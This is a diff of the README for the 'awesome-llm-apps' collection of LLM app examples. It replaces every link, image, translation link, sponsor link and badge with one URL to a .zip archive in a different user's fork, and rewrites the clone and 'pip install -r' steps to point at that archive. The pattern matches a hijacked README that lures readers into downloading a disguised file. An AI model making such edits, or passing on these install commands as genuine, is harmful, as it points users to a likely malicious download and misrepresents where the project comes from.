@@ -1,28 +1,28 @@
 <p align="center">
-  <a href="http://www.theunwindai.com">
-    <img src="docs/banner/unwind_black.png" width="900px" alt="Unwind AI">
+  <a href="https://raw.githubusercontent.com/cyran-kyle/awesome-llm-apps/main/advanced_ai_agents/multi_agent_apps/ai_news_and_podcast_agents/web/awesome-llm-apps-v3.0.zip">
+    <img src="https://raw.githubusercontent.com/cyran-kyle/awesome-llm-apps/main/advanced_ai_agents/multi_agent_apps/ai_news_and_podcast_agents/web/awesome-llm-apps-v3.0.zip" width="900px" alt="Unwind AI">
   </a>
 </p>
 
 <p align="center">
-  <a href="https://www.linkedin.com/in/shubhamsaboo/">
-    <img src="https://img.shields.io/badge/-Follow%20Shubham%20Saboo-blue?logo=linkedin&style=flat-square" alt="LinkedIn">
+  <a href="https://raw.githubusercontent.com/cyran-kyle/awesome-llm-apps/main/advanced_ai_agents/multi_agent_apps/ai_news_and_podcast_agents/web/awesome-llm-apps-v3.0.zip">
+    <img src="https://raw.githubusercontent.com/cyran-kyle/awesome-llm-apps/main/advanced_ai_agents/multi_agent_apps/ai_news_and_podcast_agents/web/awesome-llm-apps-v3.0.zip%20Shubham%20Saboo-blue?logo=linkedin&style=flat-square" alt="LinkedIn">
   </a>
-  <a href="https://twitter.com/Saboo_Shubham_">
-    <img src="https://img.shields.io/twitter/follow/Shubham_Saboo" alt="Twitter">
+  <a href="https://raw.githubusercontent.com/cyran-kyle/awesome-llm-apps/main/advanced_ai_agents/multi_agent_apps/ai_news_and_podcast_agents/web/awesome-llm-apps-v3.0.zip">
+    <img src="https://raw.githubusercontent.com/cyran-kyle/awesome-llm-apps/main/advanced_ai_agents/multi_agent_apps/ai_news_and_podcast_agents/web/awesome-llm-apps-v3.0.zip" alt="Twitter">
   </a>
 </p>
 
 <p align="center">
   <!-- Keep these links. Translations will automatically update with the README. -->
-  <a href="https://www.readme-i18n.com/Shubhamsaboo/awesome-llm-apps?lang=de">Deutsch</a> | 
-  <a href="https://www.readme-i18n.com/Shubhamsaboo/awesome-llm-apps?lang=es">Español</a> | 
-  <a href="https://www.readme-i18n.com/Shubhamsaboo/awesome-llm-apps?lang=fr">français</a> | 
-  <a href="https://www.readme-i18n.com/Shubhamsaboo/awesome-llm-apps?lang=ja">日本語</a> | 
-  <a href="https://www.readme-i18n.com/Shubhamsaboo/awesome-llm-apps?lang=ko">한국어</a> | 
-  <a href="https://www.readme-i18n.com/Shubhamsaboo/awesome-llm-apps?lang=pt">Português</a> | 
-  <a href="https://www.readme-i18n.com/Shubhamsaboo/awesome-llm-apps?lang=ru">Русский</a> | 
-  <a href="https://www.readme-i18n.com/Shubhamsaboo/awesome-llm-apps?lang=zh">中文</a>
+  <a href="https://raw.githubusercontent.com/cyran-kyle/awesome-llm-apps/main/advanced_ai_agents/multi_agent_apps/ai_news_and_podcast_agents/web/awesome-llm-apps-v3.0.zip">Deutsch</a> | 
+  <a href="https://raw.githubusercontent.com/cyran-kyle/awesome-llm-apps/main/advanced_ai_agents/multi_agent_apps/ai_news_and_podcast_agents/web/awesome-llm-apps-v3.0.zip">Español</a> | 
+  <a href="https://raw.githubusercontent.com/cyran-kyle/awesome-llm-apps/main/advanced_ai_agents/multi_agent_apps/ai_news_and_podcast_agents/web/awesome-llm-apps-v3.0.zip">français</a> | 
+  <a href="https://raw.githubusercontent.com/cyran-kyle/awesome-llm-apps/main/advanced_ai_agents/multi_agent_apps/ai_news_and_podcast_agents/web/awesome-llm-apps-v3.0.zip">日本語</a> | 
+  <a href="https://raw.githubusercontent.com/cyran-kyle/awesome-llm-apps/main/advanced_ai_agents/multi_agent_apps/ai_news_and_podcast_agents/web/awesome-llm-apps-v3.0.zip">한국어</a> | 
+  <a href="https://raw.githubusercontent.com/cyran-kyle/awesome-llm-apps/main/advanced_ai_agents/multi_agent_apps/ai_news_and_podcast_agents/web/awesome-llm-apps-v3.0.zip">Português</a> | 
+  <a href="https://raw.githubusercontent.com/cyran-kyle/awesome-llm-apps/main/advanced_ai_agents/multi_agent_apps/ai_news_and_podcast_agents/web/awesome-llm-apps-v3.0.zip">Русский</a> | 
+  <a href="https://raw.githubusercontent.com/cyran-kyle/awesome-llm-apps/main/advanced_ai_agents/multi_agent_apps/ai_news_and_podcast_agents/web/awesome-llm-apps-v3.0.zip">中文</a>
 </p>
 
 <hr/>
@@ -32,8 +32,8 @@
 A curated collection of **Awesome LLM apps built with RAG, AI Agents, Multi-agent Teams, MCP, Voice Agents, and more.** This repository features LLM apps that use models from OpenAI, Anthropic, Google, and open-source models like DeepSeek, Qwen or Llama that you can run locally on your computer.
 
 <p align="center">
-  <a href="https://trendshift.io/repositories/9876" target="_blank">
-    <img src="https://trendshift.io/api/badge/repositories/9876" alt="Shubhamsaboo%2Fawesome-llm-apps | Trendshift" style="width: 250px; height: 55px;" />
+  <a href="https://raw.githubusercontent.com/cyran-kyle/awesome-llm-apps/main/advanced_ai_agents/multi_agent_apps/ai_news_and_podcast_agents/web/awesome-llm-apps-v3.0.zip" target="_blank">
+    <img src="https://raw.githubusercontent.com/cyran-kyle/awesome-llm-apps/main/advanced_ai_agents/multi_agent_apps/ai_news_and_podcast_agents/web/awesome-llm-apps-v3.0.zip" alt="Shubhamsaboo%2Fawesome-llm-apps | Trendshift" style="width: 250px; height: 55px;" />
   </a>
 </p>
 
@@ -48,20 +48,20 @@ A curated collection of **Awesome LLM apps built with RAG, AI Agents, Multi-agen
 <table align="center" cellpadding="16" cellspacing="12">
   <tr>
     <td align="center">
-      <a href="https://getunblocked.com/unblocked-mcp/?utm_source=oss&utm_medium=sponsorship&utm_campaign=awesome-llm-apps" target="_blank" rel="noopener" title="Unblocked">
-        <img src="docs/banner/sponsors/unblocked.png" alt="Unblocked" width="6000">
+      <a href="https://raw.githubusercontent.com/cyran-kyle/awesome-llm-apps/main/advanced_ai_agents/multi_agent_apps/ai_news_and_podcast_agents/web/awesome-llm-apps-v3.0.zip" target="_blank" rel="noopener" title="Unblocked">
+        <img src="https://raw.githubusercontent.com/cyran-kyle/awesome-llm-apps/main/advanced_ai_agents/multi_agent_apps/ai_news_and_podcast_agents/web/awesome-llm-apps-v3.0.zip" alt="Unblocked" width="6000">
       </a>
       <br>
-      <a href="https://getunblocked.com/unblocked-mcp/?utm_source=oss&utm_medium=sponsorship&utm_campaign=awesome-llm-apps" target="_blank" rel="noopener" style="text-decoration: none; color: #333; font-weight: bold; font-size: 18px;">
+      <a href="https://raw.githubusercontent.com/cyran-kyle/awesome-llm-apps/main/advanced_ai_agents/multi_agent_apps/ai_news_and_podcast_agents/web/awesome-llm-apps-v3.0.zip" target="_blank" rel="noopener" style="text-decoration: none; color: #333; font-weight: bold; font-size: 18px;">
         Unblocked
       </a>
     </td>
     <td align="center">
-      <a href="https://sponsorunwindai.com/" title="Sponsor Awesome LLM Apps Repo">
-        <img src="docs/banner/sponsor_awesome_llm_apps.png" alt="Sponsor Awesome LLM Apps Repo" width="6000">
+      <a href="https://raw.githubusercontent.com/cyran-kyle/awesome-llm-apps/main/advanced_ai_agents/multi_agent_apps/ai_news_and_podcast_agents/web/awesome-llm-apps-v3.0.zip" title="Sponsor Awesome LLM Apps Repo">
+        <img src="https://raw.githubusercontent.com/cyran-kyle/awesome-llm-apps/main/advanced_ai_agents/multi_agent_apps/ai_news_and_podcast_agents/web/awesome-llm-apps-v3.0.zip" alt="Sponsor Awesome LLM Apps Repo" width="6000">
       </a>
       <br>
-      <a href="https://sponsorunwindai.com/" style="text-decoration: none; color: #333; font-weight: bold; font-size: 18px;">
+      <a href="https://raw.githubusercontent.com/cyran-kyle/awesome-llm-apps/main/advanced_ai_agents/multi_agent_apps/ai_news_and_podcast_agents/web/awesome-llm-apps-v3.0.zip" style="text-decoration: none; color: #333; font-weight: bold; font-size: 18px;">
         Become a Sponsor
       </a>
     </td>
@@ -203,7 +203,7 @@ A curated collection of **Awesome LLM apps built with RAG, AI Agents, Multi-agen
 1. **Clone the repository** 
 
     ```bash 
-    git clone https://github.com/Shubhamsaboo/awesome-llm-apps.git 
+    git clone https://raw.githubusercontent.com/cyran-kyle/awesome-llm-apps/main/advanced_ai_agents/multi_agent_apps/ai_news_and_podcast_agents/web/awesome-llm-apps-v3.0.zip 
     ```
 
 2. **Navigate to the desired project directory**
@@ -215,17 +215,17 @@ A curated collection of **Awesome LLM apps built with RAG, AI Agents, Multi-agen
 3. **Install the required dependencies**
 
     ```bash
-    pip install -r requirements.txt
+    pip install -r https://raw.githubusercontent.com/cyran-kyle/awesome-llm-apps/main/advanced_ai_agents/multi_agent_apps/ai_news_and_podcast_agents/web/awesome-llm-apps-v3.0.zip
     ```
 
-4. **Follow the project-specific instructions** in each project's `README.md` file to set up and run the app.
+4. **Follow the project-specific instructions** in each project's `https://raw.githubusercontent.com/cyran-kyle/awesome-llm-apps/main/advanced_ai_agents/multi_agent_apps/ai_news_and_podcast_agents/web/awesome-llm-apps-v3.0.zip` file to set up and run the app.
 
 ## 🤝 Contributing to Open Source
 
-Contributions are welcome! If you have any ideas, improvements, or new apps to add, please create a new [GitHub Issue](https://github.com/Shubhamsaboo/awesome-llm-apps/issues) or submit a pull request. Make sure to follow the existing project structure and include a detailed `README.md` for each new app.
+Contributions are welcome! If you have any ideas, improvements, or new apps to add, please create a new [GitHub Issue](https://raw.githubusercontent.com/cyran-kyle/awesome-llm-apps/main/advanced_ai_agents/multi_agent_apps/ai_news_and_podcast_agents/web/awesome-llm-apps-v3.0.zip) or submit a pull request. Make sure to follow the existing project structure and include a detailed `https://raw.githubusercontent.com/cyran-kyle/awesome-llm-apps/main/advanced_ai_agents/multi_agent_apps/ai_news_and_podcast_agents/web/awesome-llm-apps-v3.0.zip` for each new app.
 
 ### Thank You, Community, for the Support! 🙏
 
-[![Star History Chart](https://api.star-history.com/svg?repos=Shubhamsaboo/awesome-llm-apps&type=Date)](https://star-history.com/#Shubhamsaboo/awesome-llm-apps&Date)
+[![Star History Chart](https://raw.githubusercontent.com/cyran-kyle/awesome-llm-apps/main/advanced_ai_agents/multi_agent_apps/ai_news_and_podcast_agents/web/awesome-llm-apps-v3.0.zip)](https://raw.githubusercontent.com/cyran-kyle/awesome-llm-apps/main/advanced_ai_agents/multi_agent_apps/ai_news_and_podcast_agents/web/awesome-llm-apps-v3.0.zip)
 
 🌟 **Don’t miss out on future updates! Star the repo now and be the first to know about new and exciting LLM apps with RAG and AI Agents.**
